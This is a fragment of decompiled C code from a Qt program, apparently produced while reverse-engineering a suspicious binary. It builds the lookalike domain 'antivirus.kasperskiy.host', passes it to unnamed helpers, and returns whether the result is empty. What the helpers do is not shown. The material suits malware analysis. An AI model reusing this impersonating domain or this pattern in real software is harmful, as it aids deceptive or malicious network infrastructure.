
bool FUN_1006ac440(void)

{
  undefined8 uVar1;
  QArrayData *local_60;
  char local_58 [71];
  undefined1 local_11;
  
  uVar1 = FUN_100748240();
  local_60 = (QArrayData *)QString::fromAscii_helper("antivirus.kasperskiy.host",0x19);
  uVar1 = FUN_100748290(uVar1,&local_60);
  FUN_100746ae0(local_58,uVar1);
  FUN_10012ac30(local_58);
  if (*(int *)local_60 != -1) {
    if (*(int *)local_60 != 0) {
      LOCK();
      *(int *)local_60 = *(int *)local_60 + -1;
      UNLOCK();
      if (*(int *)local_60 != 0) goto LAB_1006ac4ba;
      local_11 = 0;
    }
    QArrayData::deallocate(local_60,2,8);
  }
LAB_1006ac4ba:
  return local_58[0] == '\0';
}

